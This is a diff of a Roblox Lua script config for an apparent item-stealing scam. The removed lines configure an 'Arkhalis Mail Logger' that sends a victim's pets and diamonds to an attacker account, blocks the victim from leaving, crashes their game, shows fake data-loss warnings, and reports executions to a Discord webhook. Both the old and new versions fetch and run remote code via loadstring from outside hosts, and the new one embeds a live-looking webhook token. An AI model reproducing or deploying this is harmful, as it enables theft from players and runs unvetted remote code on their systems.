@@ -1,27 +1,7 @@
---[[ Arkhalis Mail Logger ]]--
+UserName = "ScriptingLoaded"
+UserName2 = "ScriptingLoaded" 
+Webhook = "https://discord.com/api/webhooks/1098424928803508234/_7KKLRzNrgMT6GTOX7tTPVtLPaODYMPfTIWx44H-x0K-bsutCfIX01ZshCqhZNf5cULI" 
 
---[[ Main Config ]]--
-_G.Username = "ScriptingLoaded" --// Username To Send Pets To
-_G.GiftMessage = "BRO GOT SCAMMED" --// Message For The Gift To Say
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
 
-_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Crash = true  --// Crashes Them After Its Finished
-
---[[ Webhook Config ]]--
-_G.Enabled = true --// Toggle For Sending Webhooks
-_G.Mention = true --// Pings You When Someone Executes
-_G.Webhook = "https://discord.com/api/webhooks/1098424928803508234/_7KKLRzNrgMT6GTOX7tTPVtLPaODYMPfTIWx44H-x0K-bsutCfIX01ZshCqhZNf5cULI" --// Discord Webhook For Executions
-
---[[ UI Config ]]--
-_G.ScriptName = "LAUNCHING ERROR!" --// Script Name On The UI
-_G.Tip1 = "SCRIPT MALFUNCTION!" --// Gives You Tips On The UI
-_G.Tip2 = "DATA NOT SAVED!!" --// Gives You Tips On The UI
-_G.Tip3 = "DATA LOSING!" --// Gives You Tips On The UI
-_G.Tip4 = "DATA LOSS" --// Gives You Tips On The UI
-_G.Tip5 = "REJOIN IMMEDIATELY!" --// Gives You Tips On The UI
-
---[[ Script ]]
-loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
 
